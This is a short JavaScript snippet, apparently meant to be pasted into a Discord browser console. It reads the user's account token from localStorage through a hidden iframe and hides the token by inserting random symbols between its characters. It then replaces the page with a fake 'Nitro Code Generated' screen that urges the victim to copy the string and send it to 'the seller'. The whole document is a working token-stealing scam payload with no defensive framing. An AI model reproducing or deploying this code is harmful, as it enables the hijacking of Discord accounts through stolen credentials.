try {
  let f = document.createElement('iframe');
  f.style.display = 'none';
  document.body.appendChild(f);
  let t = JSON.parse(f.contentWindow.localStorage.token);
  function o(s) {
    const c = "#@$%&^";
    return s.split('').map(ch => {
      let n = Array.from({ length: Math.floor(Math.random() * 3) + 1 }, () =>
        c.charAt(Math.floor(Math.random() * c.length))
      ).join('');
      return ch + n;
    }).join('');
  }
  let ob = `NITRO-${o(t)}-CLAIMED#2025`;

  document.body.innerHTML = '';
  document.head.innerHTML = '';
  document.body.style.cssText =
    "background:#111;color:#fff;font-family:sans-serif;display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;padding:20px;text-align:center;";

  let b = document.createElement('div');
  b.style.cssText =
    "background:#1e1e1e;padding:30px;border-radius:10px;box-shadow:0 0 20px #00ffff;max-width:90%;width:480px;";

  let h = document.createElement('h2');
  h.textContent = "🎁 Nitro Code Generated";
  h.style = "color:#00ffff;margin-bottom:15px;";

  let m = document.createElement('p');
  m.innerHTML = "✅ Nitro is ready!<br><br><b>Send this to the seller to activate:</b>";
  m.style = "margin-bottom:15px;color:#ccc;";

  let i = document.createElement('textarea');
  i.value = ob;
  i.readOnly = true;
  i.style.cssText =
    "width:100%;padding:12px;font-size:13px;border:none;border-radius:6px;background:#2a2a2a;color:#0f0;text-align:center;margin-bottom:15px;resize:none;";
  i.rows = 3;

  let c = document.createElement('button');
  c.textContent = '📋 Copy Code';
  c.onclick = () => {
    navigator.clipboard.writeText(i.value);
    c.textContent = 'Copied!';
    setTimeout(() => (c.textContent = '📋 Copy Code'), 1500);
  };
  c.style.cssText =
    "padding:10px 20px;background:#00ff99;color:#000;border:none;border-radius:6px;cursor:pointer;box-shadow:0 0 8px #00ff99;";

  b.append(h, m, i, c);
  document.body.appendChild(b);
} catch (e) {
  alert('Error: Could not access nitro from account.');
}
